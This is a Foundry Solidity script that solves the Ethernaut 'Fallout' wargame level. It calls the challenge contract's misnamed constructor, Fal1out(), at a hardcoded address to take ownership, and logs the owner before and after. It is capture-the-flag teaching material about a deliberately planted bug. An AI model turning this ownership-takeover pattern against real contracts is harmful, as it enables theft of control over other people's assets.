// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";

import {Fallout} from "../src/Fallout.sol";

contract FalloutSolution is Script {

    Fallout public falloutInstance = Fallout(payable(0x57Fa504e124C716a629F007D4632425C396689C4));

    function run() external {
        console.log("Original owner: ", falloutInstance.owner());

        vm.startBroadcast();

        falloutInstance.Fal1out();
        
        console.log("New owner: ", falloutInstance.owner());
        console.log("My address: ", vm.envAddress("MY_ADDRESS"));

        vm.stopBroadcast();
    }
}